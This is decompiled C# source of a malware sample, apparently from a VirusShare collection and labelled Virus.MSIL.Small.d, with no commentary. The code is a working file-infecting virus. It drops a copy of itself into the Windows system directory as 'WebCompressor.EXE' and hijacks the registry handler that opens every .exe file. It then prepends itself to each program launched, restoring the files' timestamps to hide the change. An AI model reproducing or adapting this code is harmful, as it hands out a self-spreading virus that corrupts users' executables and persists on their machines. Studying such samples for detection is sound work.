// Decompiled with JetBrains decompiler
// Type: A1.Module1
// Assembly: A1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C1AB6CC2-D9C5-4370-9131-5F354F00AF83
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Virus.MSIL.Small.d-5b328849ffa3b0176bc09c399920923169a7a8ceec3f27ea9c9460fdc3c743f6.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace A1
{
  [StandardModule]
  internal sealed class Module1
  {
    [STAThread]
    public static void Main()
    {
      string executablePath = Application.ExecutablePath;
      string str1 = Path.Combine(Environment.SystemDirectory, "WebCompressor.EXE");
      byte[] array1 = new byte[5121];
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.UseShellExecute = false;
      try
      {
        FileStream fileStream = new FileStream(executablePath, FileMode.Open, FileAccess.Read);
        fileStream.Read(array1, 0, 5120);
        fileStream.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (StringType.StrCmp(executablePath, str1, false) == 0)
      {
        try
        {
          string commandLineArg = Environment.GetCommandLineArgs()[1];
          if (File.Exists(commandLineArg))
          {
            byte[] array2 = new byte[5121];
            try
            {
              FileInfo fileInfo = new FileInfo(commandLineArg);
              if (fileInfo.Length >= 5120L)
              {
                int attributes = (int) fileInfo.Attributes;
                DateTime creationTime = fileInfo.CreationTime;
                DateTime lastWriteTime = fileInfo.LastWriteTime;
                DateTime lastAccessTime = fileInfo.LastAccessTime;
                fileInfo.Attributes = FileAttributes.Normal;
                FileStream fileStream = new FileStream(commandLineArg, FileMode.Open, FileAccess.ReadWrite);
                fileStream.Read(array2, 0, 5120);
                if (StringType.StrCmp(BitConverter.ToString(array1), BitConverter.ToString(array2), false) != 0)
                {
                  fileStream.Position = 0L;
                  fileStream.Write(array1, 0, 5120);
                  fileStream.Position = fileStream.Length;
                  fileStream.Write(array2, 0, 5120);
                }
                fileStream.Close();
                fileInfo.Attributes = (FileAttributes) attributes;
                fileInfo.CreationTime = creationTime;
                fileInfo.LastWriteTime = lastWriteTime;
                fileInfo.LastAccessTime = lastAccessTime;
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            ProcessStartInfo processStartInfo = startInfo;
            processStartInfo.ErrorDialog = true;
            processStartInfo.FileName = commandLineArg;
            processStartInfo.Arguments = Interaction.Command().Remove(0, checked (Strings.Len(commandLineArg) + 2));
            try
            {
              Process.Start(startInfo);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        try
        {
          try
          {
            FileSystem.SetAttr(str1, FileAttribute.Normal);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          FileStream fileStream = new FileStream(str1, FileMode.OpenOrCreate, FileAccess.Write);
          fileStream.Write(array1, 0, 5120);
          fileStream.Close();
          FileSystem.SetAttr(str1, FileAttribute.ReadOnly);
          RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey("ExeFile\\Shell\\Open\\Command", true);
          registryKey.SetValue("", (object) (str1 + " \"%1\" %*"));
          registryKey.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          if (new FileInfo(executablePath).Length < 10240L)
            return;
          FileStream fileStream1 = new FileStream(executablePath, FileMode.Open, FileAccess.Read);
          fileStream1.Position = checked (fileStream1.Length - 5120L);
          fileStream1.Read(array1, 0, 5120);
          fileStream1.Close();
          string tempFileName = Path.GetTempFileName();
          try
          {
            FileSystem.Kill(tempFileName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          string str2 = Path.Combine(Application.StartupPath, Path.GetFileNameWithoutExtension(tempFileName) + ".EXE");
          try
          {
            FileSystem.SetAttr(str2, FileAttribute.Normal);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          File.Copy(executablePath, str2, true);
          FileStream fileStream2 = new FileStream(str2, FileMode.Open, FileAccess.Write);
          fileStream2.Write(array1, 0, 5120);
          fileStream2.SetLength(checked (fileStream2.Length - 5120L));
          fileStream2.Close();
          startInfo.FileName = str2;
          startInfo.Arguments = Interaction.Command();
          Process.Start(startInfo).WaitForExit();
          FileSystem.SetAttr(str2, FileAttribute.Normal);
          FileSystem.Kill(str2);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
